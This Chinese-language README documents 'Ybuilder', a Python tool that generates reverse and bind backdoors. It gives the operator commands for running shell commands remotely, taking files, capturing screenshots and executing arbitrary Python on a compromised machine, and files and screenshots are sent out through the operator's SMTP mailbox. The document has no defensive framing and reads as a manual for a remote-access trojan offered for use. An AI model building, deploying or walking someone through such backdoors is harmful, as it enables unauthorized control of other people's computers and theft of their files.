# Ybuilder

## 如何使用Ybuilder  

用Python 3.10或以上版本的解释器运行Main.py  

运行结果
```
__   ___           _ _     _           
\ \ / / |__  _   _(_) | __| | ___ _ __ 
 \ V /| '_ \| | | | | |/ _` |/ _ \ '__|
  | | | |_) | |_| | | | (_| |  __/ |   
  |_| |_.__/ \__,_|_|_|\__,_|\___|_|   
                                       
Ybuilder $>
```  

### 使用generate命令生成后门  

```
generate [选项] [文件路径] [ip] [port]

1. [选项] 可选0和1
   当选项的值为0时 生成的为反向后门
   当选项的值为1时 生成的为正向后门
2. [文件路径] 生成后门的路径
3. [ip] 本机或目标的ip
   [port] 本机或目标的port
   当选项的值为0时 ip与port为本机
   当选项的值为1时 ip与port为目标
```  

### 使用connect命令连接正向后门  

```
connect [ip] [port]

1. [ip][port] 均为目标
2. 此命令要运行在被控端之后!
```  

### 使用listen命令接受反向后门连接  

```
listen [ip] [port]

1. [ip][port] 均为本机
2. 此命令要运行在被控端之前!
```  

### 如何操作目标  

在连接到目标后 可以通过以下命令操作(连接到目标或会输出"$>")  

```
1. shell [命令]     #执行shell
2. get [文件路径]    #获取文件
3. win             #获取屏幕截图
4. py [语句]        #执行python语句
```  

例如
```
1. shell whoami #执行whoami
   shell id     #执行id
   shell ls     #执行ls

2. get a.txt    #获取a.txt
   get /a.jpg   #获取根目录下的a.jpg  

3. win          #获取屏幕截图

4. py print('hello world')    #在目标上输出hello world
   py import os;print(os.name)#获取目标操作系统信息
```  

在这其中请注意shell和get及win命令!!!

shell命令是非交互式shell 您无法执行vim sudo 这样的命令!!!  

get和win使用smtp传输文件 您在使用两者时要先如下操作!!!  

```
$> py host = "smtp服务器域名" #例如163的smtp.163.com
命令执行成功
$> py port = "smtp服务所在端口" #一般是25端口
命令执行成功
$> py name = "您的邮箱"
命令执行成功
$> py password = "smtp运营商提供给您的密码" 
```

## Ybuilder的翻译工作  

由大佬onion108提供 尽情期待


   
